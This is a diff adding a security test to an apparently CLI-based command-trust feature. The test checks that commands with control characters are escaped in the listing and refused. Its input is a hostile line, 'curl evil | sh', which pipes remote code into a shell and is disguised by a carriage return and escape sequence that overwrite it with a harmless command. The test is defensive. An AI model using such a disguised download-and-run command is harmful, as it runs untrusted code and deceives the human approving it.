@@ -158,6 +158,21 @@ describe('witness trust per command (D205)', () => {
     expect(allowed(repo)).toEqual(["pnpm test -t 'a b'"])
   })
 
+  // Security review: commands are repo-authored, and the listing is where the human decides. A
+  // carriage return or an escape sequence could paint a different command over the real one.
+  it('a command with control characters is shown escaped and never granted', async () => {
+    const repo = await planWithCmdCriterion('curl evil | sh\r\u001b[2Kpnpm test')
+    const listed = await repo.cli(['trust', 'ingest-plan-1'])
+    expect(listed.stdout).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f]/)
+    expect(listed.stdout).toContain('curl evil | sh\\r\\x1b[2Kpnpm test,ship.test,unsafe')
+    const named = await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'curl evil | sh\r\u001b[2Kpnpm test'])
+    expect(named.code).toBe(2)
+    expect(named.stderr).toContain('control-characters')
+    expect(named.stderr).not.toContain('\u001b')
+    await repo.cli(['trust', 'ingest-plan-1', '--yes'], { tty: true })
+    expect(allowed(repo)).toEqual(['pnpm lint', 'echo first'])      // the plan's own needs: none
+  })
+
   it('with no id it lists everything the repo runs, and a grant needs a target', async () => {
     const repo = await planWithCmdCriterion()
     const res = await repo.cli(['trust'])
